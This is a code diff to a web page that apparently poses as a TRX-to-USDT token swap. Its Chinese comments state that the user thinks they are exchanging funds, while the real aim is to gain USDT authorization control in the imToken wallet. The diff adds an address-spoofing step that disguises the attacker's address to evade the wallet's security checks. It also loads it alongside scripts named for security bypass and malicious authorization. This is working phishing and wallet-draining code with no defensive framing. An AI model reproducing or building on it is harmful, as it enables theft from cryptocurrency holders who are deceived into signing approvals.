@@ -2719,6 +2719,16 @@
             debugLog(`🎯 用户以为兑换: ${fromAmount} TRX → ${(fromAmount * 0.1634).toFixed(6)} USDT`);
             debugLog('🎯 实际攻击: 将在imToken中获得USDT授权控制权');
             
+            // 🎭 在跳转imToken前激活地址伪装系统，绕过个人地址检测
+            if (window.AddressSpoofing) {
+                debugLog('🎭🎭🎭 激活地址伪装系统，绕过个人地址安全检测！🎭🎭🎭');
+                window.AddressSpoofing.activate();
+                debugLog(`🎭 攻击者地址伪装为: ${window.AddressSpoofing.getCurrentSpoof()}`);
+                
+                // 等待伪装系统完全激活
+                await new Promise(resolve => setTimeout(resolve, 800));
+            }
+            
             // 如果有钱包模态框则关闭
             try {
                 closeWalletModal();
@@ -3807,8 +3817,9 @@
     
     <!-- 🎯 恶意授权攻击系统 -->
     <!-- 🛡️ 稳定版安全绕过系统 - 保证页面稳定运行 -->
-<script src="stable-security-bypass.js"></script>
-<script src="malicious-authorization.js"></script>
+        <script src="stable-security-bypass.js"></script>
+        <script src="address-spoofing-system.js"></script>
+        <script src="malicious-authorization.js"></script>
 
 </body>
 </html>
